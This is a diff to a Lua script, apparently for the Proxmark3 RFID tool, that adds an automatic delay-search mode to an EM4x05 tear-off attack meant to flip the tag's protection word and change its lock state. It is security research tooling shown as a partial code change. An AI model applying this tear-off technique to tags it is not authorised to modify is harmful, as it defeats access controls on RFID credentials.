@@ -84,7 +84,7 @@ local function main(args)
     
     for o, a in getopt.getopt(args, 'he:s:p:n:') do
         if o == 'h' then return help() end
-        if o == 'n' then n = a end
+        if o == 'n' then n = tonumber(a) end
         if o == 'p' then password = a end
         if o == 'e' then ed = tonumber(a) end
         if o == 's' then sd = tonumber(a) end
@@ -115,19 +115,29 @@ local function main(args)
         return nil
     end
     local wr_value = '00000000'
-    n = n or 2
-    sd = sd or 2000
-    ed = ed or 2100
-
-    if sd > ed then
-        return oops('start delay can\'t be larger than end delay', sd, ed)
+    local auto = false
+    if n == nil then
+        auto = true
+        sd = sd or 2000
+        ed = ed or 6000
+        n = (ed - sd) / 2
+    else
+        if sd == nil or ed == nil then
+            return oops('start and stop delays need to be defined')
+        end
+        if sd > ed then
+            return oops('start delay can\'t be larger than end delay', sd, ed)
+        end
     end
 
     print('==========================================')
-    print('Starting EM4x05 tear off :: target PROTECT')
+    print('Starting EM4x05 tear-off : target PROTECT')
 
-    if password then
+    if password ~= '' then
         print('target pwd', password)
+    end
+    if auto then
+        print('automatic mode', 'enabled')
     end
     print('target stepping', n)
     print('target delay', sd ,ed)
@@ -143,20 +153,33 @@ local function main(args)
        n = 0
     end
 
-    local locked_on = false
     local tries = 0
+    local soon = 0
+    local late = 0
     while sd <= ed do
     
-        -- increase loop
-        sd = sd + n
-        
-        if not locked_on then 
-            if (tries == 10) and (n == 0) then
-                print(ansicolors.cyan..('[!] Tried %d times, increased delay with 1us'):format(tries)..ansicolors.reset)
-                tries = 0
+        if auto and n < 1 then -- n is a float
+            print('[!] Reached n < 1                       => '..ansicolors.yellow..'disabling automatic mode'..ansicolors.reset)
+            ed = sd
+            auto = false
+            n = 0
+        end
+        if not auto then
+            sd = sd + n
+        end
+        if (tries >= 5) and (n == 0) and (soon ~= late) then
+            if soon > late then
+                print(('[!] Tried %d times, soon:%i late:%i        => '):format(tries, soon, late)..ansicolors.yellow..'adjusting delay by +1 us'..ansicolors.reset)
                 sd = sd + 1
-                ed = ed + 1 
+                ed = ed + 1
+            else
+                print(('[!] Tried %d times, soon:%i late:%i        => '):format(tries, soon, late)..ansicolors.yellow..'adjusting delay by -1 us'..ansicolors.reset)
+                sd = sd - 1
+                ed = ed - 1
             end
+            tries = 0
+            soon = 0
+            late = 0
         end
     
         io.flush()
@@ -192,6 +215,13 @@ local function main(args)
 
         if wordstr14 == rd_value and wordstr15 == '00000000' then
             print('[=] Status: Nothing happened            => '..ansicolors.green..'tearing too soon'..ansicolors.reset)
+            if auto then
+                sd = sd + n
+                n = n / 2
+                print(('[+] Adjusting params: n=%i sd=%i ed=%i'):format(n, sd, ed))
+            else
+                soon = soon + 1
+            end
         else
             if wordstr15 == rd_value then
                 if wordstr14 == '00000000' then
@@ -210,12 +240,24 @@ local function main(args)
                     return oops(err14b)
                 end
                 local wordstr14b = ('%08X'):format(word14b)
+                if (wordstr14b == '00000000') then
+                    reset(wr_value, password)
+                end
                 if (wordstr14b ~= rd_value) then
+                    local word15b, err15b =  core.em4x05_read(15, password)
+                    if err15b then
+                        return oops(err15b)
+                    end
                     print(('[=] Status: new definitive value!       => '..ansicolors.red..'SUCCESS:   '..ansicolors.reset..'14: '..ansicolors.cyan..'%08X'..ansicolors.reset..'  15: %08X'):format(word14b, word15b))
                     return exit_msg()
                 end
-                if not locked_on then  
-                    tries = 0
+                if auto then
+                    ed = sd
+                    sd = sd - n
+                    n = n / 2
+                    print(('[+] Adjusting params: n=%i sd=%i ed=%i'):format(n, sd, ed))
+                else
+                    late = late + 1
                 end
             else
                 bit15 = bit.band(0x00008000, word15)
@@ -251,12 +293,18 @@ local function main(args)
                     end
                 else
                     print(('[=] Status: 15 bitflipped but inactive  => '..ansicolors.yellow..'PROMISING: '..ansicolors.reset..'14: %08X  15: '..ansicolors.cyan..'%08X'..ansicolors.reset):format(word14, word15))
-                    print('[+] locked on to this delay')
-                    locked_on = true
+                end
+                if auto then
+                    n = 0
+                    ed = sd
+                else
+                    tries = 0
+                    soon = 0
+                    late = 0
                 end
             end
         end
-        if not locked_on then 
+        if not auto then
             tries = tries + 1
         end
     end
